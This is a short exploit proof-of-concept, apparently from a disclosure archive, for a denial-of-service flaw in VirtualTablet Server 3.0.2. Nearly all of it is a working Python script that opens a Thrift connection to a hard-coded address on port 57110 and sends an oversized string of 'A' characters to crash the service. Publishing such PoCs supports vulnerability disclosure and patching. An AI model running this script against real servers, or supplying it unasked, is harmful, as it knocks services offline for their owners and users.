# Title: VirtualTablet Server 3.0.2 - Denial of Service (PoC)
# Author: Dolev Farhi
# Date: 2020-04-29
# Vulnerable version: 3.0.2 (14)
# Link: http://www.sunnysidesoft.com/
# CVE: N/A


from thrift import Thrift
from thrift.transport import TSocket
from thrift.transport import TTransport
from thrift.protocol import TBinaryProtocol
from pygen.example import Example

host = '192.168.1.1'
port = 57110

try:
    transport = TSocket.TSocket(host, port)
    transport = TTransport.TBufferedTransport(transport)
    protocol = TBinaryProtocol.TBinaryProtocol(transport)
    client = Example.Client(protocol)
    transport.open()
    client.send_say('AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA')
    transport.close()

except Thrift.TException as tx:
    print(tx.message)